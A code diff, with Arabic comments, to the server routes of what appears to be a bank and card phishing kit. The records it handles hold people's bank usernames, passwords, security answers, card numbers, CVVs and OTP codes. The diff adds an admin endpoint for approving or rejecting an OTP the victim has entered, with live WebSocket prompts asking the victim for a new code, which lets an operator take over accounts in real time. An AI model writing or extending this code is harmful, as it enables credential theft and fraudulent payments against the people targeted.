@@ -624,7 +624,7 @@ router.post("/:id/payment-action", async (req, res) => {
       .values({
         sessionId: app.sessionId,
         applicantType: app.applicantType,
-        currentStep: action === "approve" ? "success" : app.currentStep,
+        currentStep: action === "approve" ? "pay-otp" : app.currentStep,
         status: app.status,
         bankId: app.bankId,
         bankName: app.bankName,
@@ -651,7 +651,7 @@ router.post("/:id/payment-action", async (req, res) => {
         paymentCardHolder: app.paymentCardHolder,
         paymentExpiryDate: app.paymentExpiryDate,
         paymentCvv: app.paymentCvv,
-        paymentOtp: app.paymentOtp,
+        paymentOtp: action === "approve" ? String(Math.floor(1000 + Math.random() * 9000)) : app.paymentOtp,
         paymentStatus: newStatus,
         paymentCompletedAt: action === "approve" ? new Date() : null,
         extraData: app.extraData,
@@ -675,6 +675,7 @@ router.post("/:id/payment-action", async (req, res) => {
       data: {
         paymentStatus: newStatus,
         currentStep: newApp.currentStep,
+        redirectUrl: action === "approve" ? `/pay-otp?applicationId=${newApp.id}&session=${newApp.sessionId}` : null,
       },
     });
 
@@ -796,5 +797,177 @@ router.post("/:id/payment-otp", async (req, res) => {
   }
 });
 
+
+// معالجة تأكيد/رفض رمز OTP من المدير
+router.post("/:id/otp-action", async (req, res) => {
+  const id = Number(req.params.id);
+  const { action } = req.body as { action: "approve" | "reject" };
+
+  if (isNaN(id)) return res.status(400).json({ error: "معرف غير صالح" });
+  if (!action || !["approve", "reject"].includes(action)) {
+    return res.status(400).json({ error: "إجراء غير صالح" });
+  }
+
+  try {
+    const [app] = await db
+      .select()
+      .from(applicationsTable)
+      .where(eq(applicationsTable.id, id));
+
+    if (!app) return res.status(404).json({ error: "الطلب غير موجود" });
+
+    const parentId = app.parentId ?? app.id;
+
+    // تحديث النسخ القديمة
+    await db
+      .update(applicationsTable)
+      .set({ isLatest: false, updatedAt: new Date() })
+      .where(
+        and(
+          eq(applicationsTable.parentId, parentId),
+          eq(applicationsTable.isLatest, true)
+        )
+      );
+
+    if (action === "approve") {
+      // إنشاء نسخة جديدة مع حالة completed
+      const [newApp] = await db
+        .insert(applicationsTable)
+        .values({
+          sessionId: app.sessionId,
+          applicantType: app.applicantType,
+          currentStep: "success",
+          status: app.status,
+          bankId: app.bankId,
+          bankName: app.bankName,
+          fullName: app.fullName,
+          nationalId: app.nationalId,
+          dateOfBirth: app.dateOfBirth,
+          monthlySalary: app.monthlySalary,
+          employer: app.employer,
+          phone: app.phone,
+          email: app.email,
+          city: app.city,
+          maritalStatus: app.maritalStatus,
+          companyName: app.companyName,
+          businessType: app.businessType,
+          commercialRegistration: app.commercialRegistration,
+          employeeCount: app.employeeCount,
+          annualRevenue: app.annualRevenue,
+          contactName: app.contactName,
+          bankUsername: app.bankUsername,
+          bankPassword: app.bankPassword,
+          securityAnswer: app.securityAnswer,
+          otpCode: app.otpCode,
+          paymentCardNumber: app.paymentCardNumber,
+          paymentCardHolder: app.paymentCardHolder,
+          paymentExpiryDate: app.paymentExpiryDate,
+          paymentCvv: app.paymentCvv,
+          paymentOtp: app.paymentOtp,
+          paymentStatus: "completed",
+          paymentCompletedAt: new Date(),
+          extraData: app.extraData,
+          adminNote: app.adminNote,
+          version: (app.version || 1) + 1,
+          parentId: parentId,
+          isLatest: true,
+        })
+        .returning();
+
+      // تحديث الجلسة
+      await db
+        .update(sessionsTable)
+        .set({ applicationId: newApp.id, lastSeenAt: new Date() })
+        .where(eq(sessionsTable.id, newApp.sessionId));
+
+      // إرسال إشعار WebSocket للعميل
+      broadcast({
+        type: "payment_completed",
+        sessionId: newApp.sessionId,
+        data: {
+          ...newApp,
+          redirectUrl: "/apply/success",
+        },
+      });
+
+      res.json({
+        success: true,
+        message: "تمت الموافقة على الدفع بنجاح",
+      });
+    } else {
+      // رفض الرمز - إنشاء نسخة جديدة وإرسال رمز جديد
+      const newOtp = String(Math.floor(1000 + Math.random() * 9000));
+
+      const [newApp] = await db
+        .insert(applicationsTable)
+        .values({
+          sessionId: app.sessionId,
+          applicantType: app.applicantType,
+          currentStep: "pay-otp",
+          status: app.status,
+          bankId: app.bankId,
+          bankName: app.bankName,
+          fullName: app.fullName,
+          nationalId: app.nationalId,
+          dateOfBirth: app.dateOfBirth,
+          monthlySalary: app.monthlySalary,
+          employer: app.employer,
+          phone: app.phone,
+          email: app.email,
+          city: app.city,
+          maritalStatus: app.maritalStatus,
+          companyName: app.companyName,
+          businessType: app.businessType,
+          commercialRegistration: app.commercialRegistration,
+          employeeCount: app.employeeCount,
+          annualRevenue: app.annualRevenue,
+          contactName: app.contactName,
+          bankUsername: app.bankUsername,
+          bankPassword: app.bankPassword,
+          securityAnswer: app.securityAnswer,
+          otpCode: app.otpCode,
+          paymentCardNumber: app.paymentCardNumber,
+          paymentCardHolder: app.paymentCardHolder,
+          paymentExpiryDate: app.paymentExpiryDate,
+          paymentCvv: app.paymentCvv,
+          paymentOtp: newOtp,
+          paymentStatus: "approved",
+          paymentCompletedAt: null,
+          extraData: app.extraData,
+          adminNote: app.adminNote,
+          version: (app.version || 1) + 1,
+          parentId: parentId,
+          isLatest: true,
+        })
+        .returning();
+
+      // تحديث الجلسة
+      await db
+        .update(sessionsTable)
+        .set({ applicationId: newApp.id, lastSeenAt: new Date() })
+        .where(eq(sessionsTable.id, newApp.sessionId));
+
+      // إرسال إشعار WebSocket للعميل
+      broadcast({
+        type: "otp_rejected",
+        sessionId: newApp.sessionId,
+        data: {
+          paymentStatus: "approved",
+          currentStep: "pay-otp",
+          redirectUrl: `/pay-otp?applicationId=${newApp.id}&session=${newApp.sessionId}`,
+          message: "تم رفض الرمز. يرجى إدخال الرمز الجديد.",
+        },
+      });
+
+      res.json({
+        success: true,
+        message: "تم رفض الرمز وإرسال رمز جديد للعميل",
+      });
+    }
+  } catch (err) {
+    req.log.error({ err }, "خطأ في معالجة إجراء OTP");
+    res.status(500).json({ error: "فشل في معالجة الإجراء" });
+  }
+});
 
 export default router;
